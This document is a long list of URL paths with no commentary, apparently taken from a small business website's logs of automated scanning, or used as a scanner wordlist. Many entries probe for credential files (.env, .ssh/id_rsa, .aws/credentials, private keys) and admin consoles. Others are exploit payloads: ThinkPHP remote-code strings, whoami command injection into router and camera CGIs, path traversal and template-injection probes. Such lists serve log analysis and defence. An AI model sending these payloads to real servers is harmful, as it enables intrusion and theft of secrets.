__Additional
_aliases
_all/_search
_async/AsyncResponseService
_async/favicon.ico
_cat/indices
_cat/indices?format=json&h=index
_cat/indices?format=json&pretty=true
_cat/indices?v
_cat/indices/
_cluster/health?level=indices
_cluster/state/nodes,routing_table
_config
_fragment
_ignition/execute-solution
_my_sql_tool_/import.php
_nodes
_phpmyadmin/import.php
_phpMyAdmin/index.php?lang=en
_profiler/phpinfo
_search
_search?pretty
_search?source
_stats
_stats/indices
_status
::$DATA
?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
?author=1
?ip=8.8.8.8
?s={search_term_string}
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP
?XDEBUG_SESSION_START=phpstorm
.aws/credentials
.bash_history/
.DS_Store
.env
.env.bak
.env.dev
.env.prod
.env.stage
.env/.env
.git/
.git/config
.git/config/
.git/HEAD
.hg
.htaccess/
.idea/workspace.xml
.json
.mysql_history/
.pgsql_history/
.sqlite_history/
.ssh/id_dsa
.ssh/id_rsa
.ssh/id_rsa.pub/
.ssh/id_rsa/
.svn/entries
.twilio.env
.well-known/security.txt
.well-known/security.txt/
*
*/_settings
%5ccgi-bin/get_status.cgi
%5ccgi-bin/login.cgi
+CSCOE+/logon.html
0bef
1phpmyadmin/
2020/wp-includes/wlwmanifest.xml
2phpmyadmin/
3phpmyadmin/
404/index.html
4phpmyadmin/
5yfI
a2billing/customer/templates/default/footer.tpl
aaa9
aab9
aastra/
ab2g
ab2h
about
about/
About/checkup
account/
Account/
account/login
actuator
actuator/auditevents
actuator/beans
actuator/conditions
actuator/configprops
actuator/env
actuator/envinterfaces
actuator/health
actuator/health
actuator/heapdump
actuator/heapdumpinterfaces
actuator/httptrace
actuator/hystrix.stream
actuator/info
actuator/jolokia
actuator/jolokiainterfaces
actuator/loggers
actuator/mappings
actuator/metrics
actuator/refresh
actuator/restart
actuator/scheduledtasks
actuator/threaddump
admin
admin_user/m_tixian.php
admin-app/.env
admin-scripts.asp
admin/
admin/.env
admin/config.php
admin/connection/
admin/db/
admin/import.php
Admin/import.php
admin/includes/general.js
admin/index
admin/index/login?url=%2F
admin/phpmyadmin/
admin/phpMyAdmin/
admin/phpmyadmin/index.php/
admin/phpMyAdmin/index.php/
admin/phpmyadmin2/index.php/
admin/pMA/
admin/pMA/index.php?lang=en
admin/sqladmin/
admin/sysadmin/
admin/view/javascript/common.js
admin/web/
admin/webadmin.php?mod=do&act=login
administrator/
administrator/admin/
administrator/db/
administrator/help/en-GB/toc.json
administrator/index.php
administrator/language/en-GB/install.xml
administrator/phpmyadmin/
administrator/phpMyAdmin/
administrator/pma/
administrator/PMA/
administrator/web/
ajax?act=getrlist&rid=1
ajax?act=online&rst=12
ajax/allcoin_a/id/0?t=0.3782499195965951
algo/
amfeed/main/download
anquan/qgga.asp
api
api-docs
api.html
api.php?key=1
api/.env
api/ApiHub/fetchJinse
api/app/config_new
api/apps
api/common/getConfig
api/config-init
api/contactWay
api/content_bottom
api/currency/quotation_new
api/customerServiceLink
api/exclude/siteConfig/webSiteConfig
api/index.html
api/Index/getLottery
api/index/grailindex
api/index/loansList
api/index/webconfig
api/islogged
api/jsonws/invoke
api/linkPF
api/message/webInfo
api/mobile/checkStrategyHistory
api/product/topRank?token=null&uid=null&lang=null&direct=1&type=1
api/public/?service=Home.getConfig
api/search?folderIds=0
api/site/getInfo.do
api/stock/getSingleStock.do?code=002405
api/swagger-ui.html
api/system/system/config/get
api/uploads/apimap
api/user/get_user_group
api/user/info?&&callback=jsonp_1601457046411_20983
api/user/ismustmobile
api/v/index/queryOfficePage?officeCode=customHomeLink
api/v1
api/v1/about
api/v1/borrowxx.html
api/v1/invest
api/v1/label/__name__/values
api/v1/label/goversion/values
api/v1/label/version/values
api/v1/labels
api/v1/member/kefu
api/v1/pods
api/v1/query?query=prometheus_build_info
api/v1/targets
api/v2/ajax
api/v2/api-docs
api/wallet/redDetail
api/web/user/getIndexData.php
apis/api/index
app/.env
app/common/getRegisterSet
app/js/base.js
appenv
application.wadl/
appxz/index.html
article?id=${7*7}
assets/.env
assets/dist/static/js/vendor_prod.js
assets/extension/market/css/mt4.css
assets/js/dmshub.js
assets/res/mods/room.js
assets/room/css/room_mobile.css
asterisk.cfg/
asterisk.conf/
asterisk/
ata/
atacom/
au6Q
auditevents
auth
auth/ui/PWResetUserValidation
author/breakoutroomllcgmail-com
author/breakoutroomllcgmail-com/
autoconfig
Autodiscover/Autodiscover.xml
autoprovision/
aws.yml
axis2/axis2-admin/login
az.php
azenv
azenv.php
backup
backup.zip
backup/
backupmgt/localJob.php?session=fail;whoami
backupmgt/localJob.php?session=fail;whoami
backups/
bag2
banner.do?code=1
base/exchange_article/index/classid/1/id/1
base/exchange_index/changepwdfirst
base/exchange_index/googlecode
base/goexjs
bc
beans
bfdnffektc/index.php
bk
bkp/
blog
blog/
blog/page/2
blog/wp-content/plugins/wp-statistics/readme.txt
blog/wp-includes/wlwmanifest.xml
blog/wp-login.php
BMTz
boaform/admin/formLogin
boaform/admin/formLogin_en
boaform/admin/formLogin?username=admin&psd=admin
boaform/admin/formLogin?username=adminisp&psd=adminisp
boaform/admin/formLogin?username=ec8&psd=ec8
boaform/admin/formLogin?username=user&psd=user
boaform/admin/formPing
boaform/admin/formTracert
boafrm/formLogin
board.cgi?
board.cgi?cmd=whoami
c/
c/version.js
caches
category/brewery-heist
category/corporate-team-building
category/date-night
category/family-friendly-escape-room
category/private-booking-escape-room
category/private-booking-escape-room/
category/uncategorized
category/uncategorized/
cdn-cgi/trace
cdn-cgi/trace
cfg/
CFIDE/administrator/
cgi
cgi-bin/;
cgi-bin/;whoami
cgi-bin/authLogin.cgi
cgi-bin/config.exp
cgi-bin/gw.cgi?
cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20pwd=%22%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_=1620893377014
cgi-bin/kerbynet?
cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0Awhoami%0A'
cgi-bin/luci
cgi-bin/masterCGI?ping=nomip&user=;whoami
cgi-bin/masterCGI?ping=nomip&user=;whoami
cgi-bin/nobody/Search.cgi?
cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(whoami)&password=admin
cgi-bin/printenv.pl/
cgi-bin/system_mgr.cgi?
cgi-bin/webctrl.cgi
CGI/EXECUTE.php
check
check.php
cisco/
Cjz5
claroline/phpMyAdmin/index.php/
client_area/
client/api/findConfigByKey?configKey=level_config
client/api/findFreeTrade
clientaccesspolicy.xml
cluster
cms/
cms/administrator/index.php
cms/wp-includes/wlwmanifest.xml
comments/feed/
common.js
common/download.js
common/info.cgi
common/member/js/user.util.js
common/template/lottery/lecai/css/style.css
conditions
conf.cfg/
conf/
config
config.js
config.json
config.php?_=3283&1922563758
config.txt/
config/aws.yml
config/getuser?index=0
config/jwt/private.pem
configprops
configuration>
console/
console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi")
console/login/LoginForm.jsp
contact
contact/
containers/json
Content/common/web/CommonActivity.css
Content/css/wzwstylel.css
Content/favicon.ico
Content/Wap/base.css
core/.env
cq/css/cssy.css
cscpLoginWeb/app/home
cscpLoginWeb/scripts/public.js
csjs/bankCheck.js
css/all.css
css/app.css
css/dafa.css
Css/Hm.css
Css/index.css
css/info.css
css/main.css
css/nsc/reset.css
css/skin/ymPrompt.css
css/style.css
css/view/main/goin.css
css/view/main/style.css
cuic
currentsetting.htm
CVS/Entries
DaGp
dana-na/nc/nc_gina_ver.txt
data/
data/json/config.json
database/
db/
db/db-admin/
db/dbadmin/
db/dbweb/
DB/import.php
db/myadmin/
db/phpMyAdmin-3/
db/phpmyadmin/
db/phpMyAdmin/
db/phpmyadmin/index.php?lang=en
db/phpmyadmin3/
db/phpMyAdmin3/
db/phpMyAdmin3/index.php?lang=en
db/webadmin/
db/webdb/
db/websql/
dbadmin/
dbadmin/import.php
dbAdmin/import.php
DBadmin/import.php
DBAdmin/import.php
dbadmin/index.php?lang=en
dbmanager/import.php
dbweb/import.php
debug/requests
Default.aspx
default.jsp
digium/
distv2/index.html
dniapi/userInfos
dns-query?
dns-query?dns=KhUBAAABAAAAAAAAA3d3dwZnb29nbGUDY29tAAABAAE
dnslookup.cgi
docs
douyinpay.php?order=20210815173223834
drupal/
dubbo-provider/distv2/index.html
dump
dump.tar.gz
dumper/main.php
echo.php
echo.php?
ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
editBlackAndWhiteList
english/
env
env.dev
env.prod
env.stage
env/
envafter
envinterface
envor
envSetting
envsometimes
envwill
escape-rooms
escape-rooms/
etc/asterisk/
etc/asterisk/extensions.conf/
etc/asterisk/sip.conf/
explore/
explore/repos/
extensions.conf/
favicon.ico
favicon.ico/
favicon.png
fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media
feed/
fePublicInfo/
ff/css/cssy.css
fgdfkgjhsf.php
files/pub_rem.js
files/pub_reset.css
firmware/
fj9T
flu/403.html
flyway
friendGroup/list
Front/FctPage/Start.aspx
Front/User/UserLogin.html
ftptest.cgi
ftptest.cgi?loginuse=&loginpas=
fuN3
gallery
gallery/
gateway/
Gemfile.lock/
Gemfile/
getConfig/getArticle.do?code=1
getConfig/getArticle.do?code=19
getConfig/listPopFrame.do?code=1&position=index&_=1601489645097
getConfig/listPopFrame.do?code=14&position=index
getConfig/listPopFrame.do?code=14&position=index&_=1601489645097
getLocale
getpage.gch?pid=1001&logout=1
goautodial/
goform/formWsc
GponForm/diag_Form?images/
GponForm/diag_Form?style/
grandstream/
gs/
guess/list.php?pageNum=1
h2-console
h2-console/login.do
h2-console/login.jsp
h5/
health
heapdump
heapdumpor
HNAP1/
home
Home/Bind/binding
Home/Get/getJnd28
Home/GetAllGameCategory
Home/GetInitSource
home/GetQrCodeInfo
Home/Index/ajaxTJ
home/loadmymanager
home/login/login_index.html
home/main/login
homes/
host-manager/html
host.key
host/
hotmail-com.olc.protection.outlook.com:25
httptrace
hudson
hudson/login
hudson/script
icingaweb2/
id_dsa
id_rsa
idx_config/
iframe/rankgiftgotapi/1005
im/
im/h5/
im/in/GetUuid
images/editor/separator.gif
images/Nxrs4tAtO/HCw4_2FQ7o69dmQEodXU/_2Fua56jJgWqt8tN1Tx/0M9Tus5G1nAOe_2BJflcrm/2nz3T7AxG_2Fd/YnZ7Cn6A/zq1HlKYZhiFyQLgflmvIbb1/yQL2MK3UaK/00uQsiMnxrcs4C9gN/xpGuwRLuq6tH/7YwEr.avi
images/src_images_but_dianz_s.png
img/zllqdk.png
imgs/ms_check_license
incl/image_test.shtml
incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22whoami%22%20--%3e
include
include/makecvs.php?
include/makecvs.php?Event=%60whoami%60
index
index.action
index.do
index.jsp
index.php
index.php?m=api&c=app&a=getPlatformConfig
index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
index.php?s=index/\think\Request/input&filter=phpinfo&data=1
index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
index.php/api/other/appSetting
index.php/Index/register.html
index.php/sign
index.php/Wap/Api/getBanner
index.php/Wap/Api/getSystemNotice?id=1
index/api/config
index/index/andiro
index/login/register
index/Mobile/fenshi?code=sz002405
index/Mobile/kline_week?code=sz003043
indexAction.action
infe/rest/fig/advertise/common.json?mobile_open=1
infe/rest/flash/getServerIP.json
info
info.php
info.php/
install.php
install/install.php
intergrationgraph
invoker/EJBInvokerServlet
invoker/JMXInvokerServlet
invoker/readonly
ip
ipc$
ipl/app/flash/publicbmw/ball/FigLeaf.js?site=member
ipp
ISAPI/Security/userCheck
jars
javax.faces.resource/dynamiccontent.properties.xhtml
jenkins/login
jenkins/script
Jenkinsfile/
jiaoyimao/default.css
jkstatus
jmx-console
jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo/github.com
jolokia
jolokia/listlooking
jolokia/listthe
jolokiaor
joomla/administrator/index.php
Joomla/administrator/index.php
js/a.script
js/app.ling.js
js/base.js
js/base1.js
js/basic.js
js/chat/chat.js
js/common.js
js/config20181225.js
js/dianzan.js
js/header-rollup-554.js
js/home.js
js/json.js
JS/loginstatus.js
js/tvConfig.js
json
json/configs/permanent/permanent-lottery-config-list.json
jsproxy
jwt/private.pem
K2fz
kefu.php
key.pem
kkrp/site/info
kkrps/im_group/show_members
KXHr
LADSS/
langConfig.js
language/Swedish
language/Swedish${IFS}&&${IFS}whoami;/string.js
lanren/css/global.css
laravel/.env
leftDao.php?callback=jQuery183016740860980352856_1604309800583
legal/currency/set
Line/
Lines/
linksys/
liquibase
loan
local/config.txt
locale/Goex/zh/common.js
localhost.key
localhost/
logfile
loggers
login
login?from=%2F
login.action
login.asp
login.aspx
Login.aspx
login.cgi
login.do
login.gch
login.gch/
login.html
login.jsp
login.php
login/img/nyyh/chkjs.js
login/img/nyyh/game.css
login/indexAction.action
login/kefuxian.mvc
login/login.jsp
logo.swf
logon
m.api
m/
m/allticker/1
m/ticker/usdtqc
magmi-importer/web/download_file.php
magmi/web/download_file.php
mail/
main
main.jsp
maint/modules/home/index.php?
maint/modules/home/index.php?lang=english|whoami||x
manage
manage
management
manager
manager_dev_ping_t.gch
manager/html
manager/html
manager/js/left.js
manager/login
manager/text/list
manager/text/list
mappings
market/getStockBaseInfo?stockCodeInternal=2658
market/market-ws/iframe.html
master-status
media/wp-includes/wlwmanifest.xml
melody/api/v1/pageconfig/list
member
member/js/lang_zh_CN.js
metrics
metrics/
mh/phone.do
mifs/.;/services/LogService
misc/ajax.js
mitel/
mobile/config.js
mobile/script/main.m.js
mobile/v3/appSuperDownload.do
MOVEitISAPI/MOVEitISAPI.dll?action=capa
msd/main.php
msd1.24.4/main.php
msd1.24stable/main.php
mtja.html
muieblackcat
my.key
myadmin/
MyAdmin/
myadmin/import.php
myAdmin/import.php
MyAdmin/import.php
MYadmin/import.php
MYAdmin/import.php
myadmin/index.php?lang=en
myadmin/scripts/setup.php
MyAdmin/scripts/setup.php
myadminphp/
myConfig.js
mysql-admin/
mysql/
mysql/admin/
mysql/db/
mysql/dbadmin/
mySql/import.php
mySQL/import.php
mysql/main.php
mysql/mysqlmanager/
mysql/pma/
mysql/pMA/
mysql/pMA/index.php?lang=en
mysql/sqlmanager/
mysql/sqlmanager/index.php?lang=en
mysql/web/
mysqladmin/
mysqladmin/import.php
mysqladmin/index.php?lang=en
mysqldumper/main.php
mySqlDumper/main.php
MySQLDumper/main.php
mysqlmanager/
mysqlmanager/import.php
mySQLmanager/import.php
MySqlManager/import.php
MySQLManager/import.php
mytio/config/base
n/news/banner?column_id=303
new
news/wp-includes/wlwmanifest.xml
nice%20ports%2C/Tri%6Eity.txt%2ebak
nifi/
NOnR
nyyh/chkjs.js
nyyh/game.css
o/headless-delivery/v1.0/openapi.yaml
o1o/a8.php
old
old-site
oldsite
openam/ui/PWResetUserValidation
oscommerce-2.3.4.1/catalog/install/install.php?step=4
otc/
otrs/
owa
owa/
owa/auth/logon.aspx
owa/auth/logon.aspx?
owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f
owa/auth/x.js
p/m/a/
p/m/a/import.php
p4rG
pages/console/js/common.js
panasonic/
Pc/Lang/index.html
phone.cfg/
phone/
phone1.cfg/
photo/p/api/album.php
php-my-admin/
php-my-admin/import.php
php-my-admin/index.php?lang=en
php-myadmin/
php-myadmin/import.php
phpinfo
phpinfo.php
phpinfo.php/
phpMa/import.php
phpMA/import.php
phpmanager/
phpmy-admin/
phpmy/
phpmy/index.php?lang=en
phpmya~1/index.php
phpmya~1/phpmyadmin/index.php
phpmyad-sys/
phpmyadmin
phpMyAdmin
phpMyadmin_bak/index.php/
phpMyAdmin-1.1.0/import.php
phpMyAdmin-1.3.0/import.php
phpMyAdmin-2.0.5/import.php
phpMyAdmin-2.1.0/import.php
phpMyAdmin-2.10.0-beta1/import.php
phpMyAdmin-2.10.0-rc1/import.php
phpMyAdmin-2.10.0.1/import.php
phpMyAdmin-2.10.0.2/import.php
phpMyAdmin-2.10.0/import.php
phpMyAdmin-2.10.1-rc1/import.php
phpMyAdmin-2.10.1/import.php
phpMyAdmin-2.10.2-rc1/import.php
phpMyAdmin-2.10.2/import.php
phpMyAdmin-2.10.3-rc1/import.php
phpMyAdmin-2.10.3/import.php
phpMyAdmin-2.11.0-beta1/import.php
phpMyAdmin-2.11.0-rc1/import.php
phpMyAdmin-2.11.0-rc2/import.php
phpMyAdmin-2.11.0/import.php
phpMyAdmin-2.11.1-rc1/import.php
phpMyAdmin-2.11.1.1/import.php
phpMyAdmin-2.11.1.2/import.php
phpMyAdmin-2.11.1/import.php
phpMyAdmin-2.11.10.1/import.php
phpMyAdmin-2.11.11-rc1/import.php
phpMyAdmin-2.11.11.1/import.php
phpMyAdmin-2.11.11.2/import.php
phpMyAdmin-2.11.11.3/import.php
phpMyAdmin-2.11.11/import.php
phpMyAdmin-2.11.2-rc1/import.php
phpMyAdmin-2.11.2.1/import.php
phpMyAdmin-2.11.2.2/import.php
phpMyAdmin-2.11.2/import.php
phpMyAdmin-2.11.3-rc1/import.php
phpMyAdmin-2.11.3/import.php
phpMyAdmin-2.11.4-rc1/import.php
phpMyAdmin-2.11.4/import.php
phpMyAdmin-2.11.5-all-languages/import.php
phpMyAdmin-2.11.5-rc1/import.php
phpMyAdmin-2.11.5.1-all-languages/
phpMyAdmin-2.11.5.1/import.php
phpMyAdmin-2.11.5.2/import.php
phpMyAdmin-2.11.5/import.php
phpMyAdmin-2.11.6-all-languages/
phpMyAdmin-2.11.6-rc1/import.php
phpMyAdmin-2.11.6/import.php
phpMyAdmin-2.11.7-rc1/import.php
phpMyAdmin-2.11.7-rc2/import.php
phpMyAdmin-2.11.7.1-all-languages-utf-8-only/
phpMyAdmin-2.11.7.1-all-languages/
phpMyAdmin-2.11.7.1/import.php
phpMyAdmin-2.11.7/import.php
phpMyAdmin-2.11.8-rc1/import.php
phpMyAdmin-2.11.8.1-all-languages-utf-8-only/
phpMyAdmin-2.11.8.1-all-languages/
phpMyAdmin-2.11.8.1/import.php
phpMyAdmin-2.11.8/import.php
phpMyAdmin-2.11.9.1/import.php
phpMyAdmin-2.11.9.2/import.php
phpMyAdmin-2.11.9.4/import.php
phpMyAdmin-2.11.9.5/import.php
phpMyAdmin-2.11.9.6/import.php
phpMyAdmin-2.11.9/import.php
phpMyAdmin-2.2.3/
phpMyAdmin-2.2.3/import.php
phpMyAdmin-2.2.6/
phpMyAdmin-2.2.6/import.php
phpMyAdmin-2.5.1/
phpMyAdmin-2.5.1/import.php
phpMyAdmin-2.5.4/
phpMyAdmin-2.5.4/import.php
phpMyAdmin-2.5.5-pl1/
phpMyAdmin-2.5.5-pl1/import.php
phpMyAdmin-2.5.5-rc1/
phpMyAdmin-2.5.5-rc1/import.php
phpMyAdmin-2.5.5-rc2/
phpMyAdmin-2.5.5-rc2/import.php
phpMyAdmin-2.5.5/
phpMyAdmin-2.5.5/import.php
phpMyAdmin-2.5.6-rc1/
phpMyAdmin-2.5.6-rc1/import.php
phpMyAdmin-2.5.6-rc2/
phpMyAdmin-2.5.6-rc2/import.php
phpMyAdmin-2.5.6/
phpMyAdmin-2.5.6/import.php
phpMyAdmin-2.5.7-pl1/
phpMyAdmin-2.5.7-pl1/import.php
phpMyAdmin-2.5.7/
phpMyAdmin-2.5.7/import.php
phpMyAdmin-2.6.0-alpha/
phpMyAdmin-2.6.0-alpha/import.php
phpMyAdmin-2.6.0-alpha2/
phpMyAdmin-2.6.0-alpha2/import.php
phpMyAdmin-2.6.0-beta1/
phpMyAdmin-2.6.0-beta1/import.php
phpMyAdmin-2.6.0-beta2/
phpMyAdmin-2.6.0-beta2/import.php
phpMyAdmin-2.6.0-pl1/
phpMyAdmin-2.6.0-pl1/import.php
phpMyAdmin-2.6.0-pl2/
phpMyAdmin-2.6.0-pl2/import.php
phpMyAdmin-2.6.0-pl3/
phpMyAdmin-2.6.0-pl3/import.php
phpMyAdmin-2.6.0-rc1/
phpMyAdmin-2.6.0-rc1/import.php
phpMyAdmin-2.6.0-rc2/
phpMyAdmin-2.6.0-rc2/import.php
phpMyAdmin-2.6.0-rc3/
phpMyAdmin-2.6.0-rc3/import.php
phpMyAdmin-2.6.0/
phpMyAdmin-2.6.0/import.php
phpMyAdmin-2.6.1-pl1/
phpMyAdmin-2.6.1-pl1/import.php
phpMyAdmin-2.6.1-pl2/
phpMyAdmin-2.6.1-pl2/import.php
phpMyAdmin-2.6.1-pl3/
phpMyAdmin-2.6.1-pl3/import.php
phpMyAdmin-2.6.1-rc1/
phpMyAdmin-2.6.1-rc1/import.php
phpMyAdmin-2.6.1-rc2/
phpMyAdmin-2.6.1-rc2/import.php
phpMyAdmin-2.6.1/
phpMyAdmin-2.6.1/import.php
phpMyAdmin-2.6.2-beta1/
phpMyAdmin-2.6.2-beta1/import.php
phpMyAdmin-2.6.2-pl1/
phpMyAdmin-2.6.2-pl1/import.php
phpMyAdmin-2.6.2-rc1/
phpMyAdmin-2.6.2-rc1/import.php
phpMyAdmin-2.6.2/
phpMyAdmin-2.6.2/import.php
phpMyAdmin-2.6.3-pl1/
phpMyAdmin-2.6.3-pl1/import.php
phpMyAdmin-2.6.3-rc1/
phpMyAdmin-2.6.3-rc1/import.php
phpMyAdmin-2.6.3/
phpMyAdmin-2.6.3/import.php
phpMyAdmin-2.6.4-pl1/
phpMyAdmin-2.6.4-pl1/import.php
phpMyAdmin-2.6.4-pl2/
phpMyAdmin-2.6.4-pl2/import.php
phpMyAdmin-2.6.4-pl3/
phpMyAdmin-2.6.4-pl3/import.php
phpMyAdmin-2.6.4-pl4/
phpMyAdmin-2.6.4-pl4/import.php
phpMyAdmin-2.6.4-rc1/
phpMyAdmin-2.6.4-rc1/import.php
phpMyAdmin-2.6.4/
phpMyAdmin-2.6.4/import.php
phpMyAdmin-2.7.0-beta1/
phpMyAdmin-2.7.0-beta1/import.php
phpMyAdmin-2.7.0-pl1/
phpMyAdmin-2.7.0-pl1/import.php
phpMyAdmin-2.7.0-pl2/
phpMyAdmin-2.7.0-pl2/import.php
phpMyAdmin-2.7.0-rc1/
phpMyAdmin-2.7.0-rc1/import.php
phpMyAdmin-2.7.0/
phpMyAdmin-2.7.0/import.php
phpMyAdmin-2.8.0-beta1/
phpMyAdmin-2.8.0-beta1/import.php
phpMyAdmin-2.8.0-rc1/
phpMyAdmin-2.8.0-rc1/import.php
phpMyAdmin-2.8.0-rc2/
phpMyAdmin-2.8.0-rc2/import.php
phpMyAdmin-2.8.0.1/
phpMyAdmin-2.8.0.1/import.php
phpMyAdmin-2.8.0.2/
phpMyAdmin-2.8.0.2/import.php
phpMyAdmin-2.8.0.3/
phpMyAdmin-2.8.0.3/import.php
phpMyAdmin-2.8.0.4/
phpMyAdmin-2.8.0.4/import.php
phpMyAdmin-2.8.0/
phpMyAdmin-2.8.0/import.php
phpMyAdmin-2.8.1-rc1/
phpMyAdmin-2.8.1-rc1/import.php
phpMyAdmin-2.8.1/
phpMyAdmin-2.8.1/import.php
phpMyAdmin-2.8.2.1/import.php
phpMyAdmin-2.8.2.2/import.php
phpMyAdmin-2.8.2.3/import.php
phpMyAdmin-2.8.2/
phpMyAdmin-2.8.3/
phpMyAdmin-2.8.4/
phpMyAdmin-2.8.5/
phpMyAdmin-2.8.6/
phpMyAdmin-2.8.7/
phpMyAdmin-2.8.8/
phpMyAdmin-2.8.9/
phpMyAdmin-2.9.1/
phpMyAdmin-2.9.2/
phpMyAdmin-2/
phpMyAdmin-3/
phpMyAdmin-4.2.1-english/import.php
phpMyAdmin-4.6.4/
phpMyAdmin-4/
phpmyadmin-old/index.php/
phpMyAdmin.old/index.php/
phpmyadmin/
phpmyAdmin/
phpMyadmin/
phpMyAdmin/
phpmyadmin/admin/
phpmyadmin/ChangeLog/
PHPMYADMIN/import.php
phpmyadmin/index.php
phpmyadmin/index.php/
phpMyAdmin/index.php/
phpmyadmin/phpmyadmin/index.php/
phpMyAdmin/phpMyAdmin/index.php/
phpmyadmin/scripts/setup.php
phpMyAdmin/scripts/setup.php
phpmyadmin/scripts/setup.php/
phpMyAdmin/scripts/setup.php/
phpmyadmin/sql.php
phpmyadmin0/index.php/
phpmyadmin1/
phpmyadmin1/index.php/
phpmyadmin2/
phpMyAdmin2/
phpMyAdmin2/index.php?lang=en
phpmyadmin2/index.php/
phpmyadmin2011/index.php?lang=en
phpmyadmin2016/index.php?lang=en
phpmyadmin3/
phpMyAdmin3/
phpMyAdmin3/index.php?lang=en
phpmyadmin4.8.5/index.php
phpmyadmin4/
phpMyAdmin4/
phpMyAdmin5/index.php?lang=en
phpMyAdminold/index.php/
phpMyAds/
phppgadmin/
phppma/
phppma/index.php?lang=en
phptest.php/
picdesc.xml
picsdesc.xml
pingkon.php?q=query
plugins/system/debug/debug.xml
pma
pma/
PMA/
pMA/import.php
PMA/import.php
pma/index.php?lang=en
pma/scripts/setup.php
pma2005/
PMA2005/
pMA2005/import.php
PMA2005/import.php
pMA2006/import.php
PMA2006/import.php
pma2009/
PMA2009/
pma2011/
PMA2011/
PMA2011/index.php?lang=en
pma2012/
PMA2012/
pma2013/
PMA2013/
PMA2013/index.php?lang=en
pma2014/
PMA2014/
pma2015/
PMA2015/
pma2015/index.php?lang=en
pma2016/
PMA2016/
PMA2016/index.php?lang=en
pma2019/index.php?lang=en
pmd
pmd/index.php
polycom/
portal.php?type=stb&action=handshake&token=&prehash=0&JsHttpRequest=1-xml
portal/index/protocol.html
portal/redlion
preseed.cfg
private-key
private.pem
privatekey.key
product/list
program/
prometheus
Promotions/list.mvc
prov/
provision/
provisioning/
proxy-test.rainng.com:443
proxy/games
proxy/settings
PSBlock
public
public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
public/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
public/?s=index/\think\Request/input&filter=phpinfo&data=1
public/.env
public/admin.php/api/index/loansList
public/appapi/images/error.jpg
Public/css/_pk10.css
Public/css/errorCss.css
Public/css/hall.css
public/css/style.css
public/h5static/js/main.js
Public/home/common/js/index.js
Public/Home/ecshe_css/main.css?v=1543997196
Public/Home/images/game/pk10.png
Public/home/js/check.js
Public/Home/js/cls.js
Public/Home/js/common.js
Public/Home/js/game.js
Public/home/wap/css/qdgame.css
public/img/cz1.png
public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
Public/initJs.php
Public/js/common.js
Public/Mobile/ecshe_css/wapmain.css?v=1545408652
Public/mobile/js/config.js
public/tpl/default/static/css.css
Public/uploads/web/step1.png
public/wap/js/basis.js
Public/Wchat/css/index.css
Public/Wchat/js/cvphp.js
public/web/css/add//index.css
public/web/js/add/com.js
pv/aastra.cfg
r8kH
rEbD
recordings/theme/main.css
Recruit/download_url
recv4.php
refresh
refreshan
refreshinterfaces
register.jsp
remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
ReportServer
Res/font/font.css
resources/css/headernav.css
resources/main/common.js
restapps/applications.php?
restapps/applications.php?linestate=$$LINESTATE$$&user=100%0AContext%3A%20ext-local%0A%0AAction%3A%20Originate%0AChannel%3A%20Local%2F555%40app-chanspy%0AApplication%3A%20system%0Adata%3A%20whoami%0A%0A%0A%0A
restart
restartrestart
robots.txt
robots.txt/
room/getRoomBangFans
room/script/face.js
RPC2
run
s_api/basic/config_js?callback=__set_config
s_api/basic/download/info
sangoma/
scheduledtasks
screenshot.png
script
script/public.js
Scripts/common.js
sdk
secure/ContactAdministrators!default.jspa
secure/Dashboard.jspa
sellers.json
sendgrid.env
server_info
server-info
server-status
server.key
service?action=getBasicInfo&terminal_id=1
service/extdirect
sessions
set_ftp.cgi?
set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28whoami%29
setup.cgi?
setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=whoami;&curpath=/&currentsetting.htm=1
setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=whoami;&curpath=/&currentsetting.htm=1
setup.xml
setup/eureka_info
setup/index.jsp
shell?
shell?whoami;
shop/.env
shop/wp-includes/wlwmanifest.xml
shopdb/
shutdown
signup
sip.cfg/
sip.conf/
sip.txt/
sip/
sip/sitemap/
sipconf.cfg/
sipconf.txt/
sipconf/
sipura/
site.js
site/get-hq?proNo=btc&panType=1&pid=1
site/info
site/wp-includes/wlwmanifest.xml
sitemap_index.xml
sitemap.sip/
sitemap.xml
sitemap/asterisk/
sito/wp-includes/wlwmanifest.xml
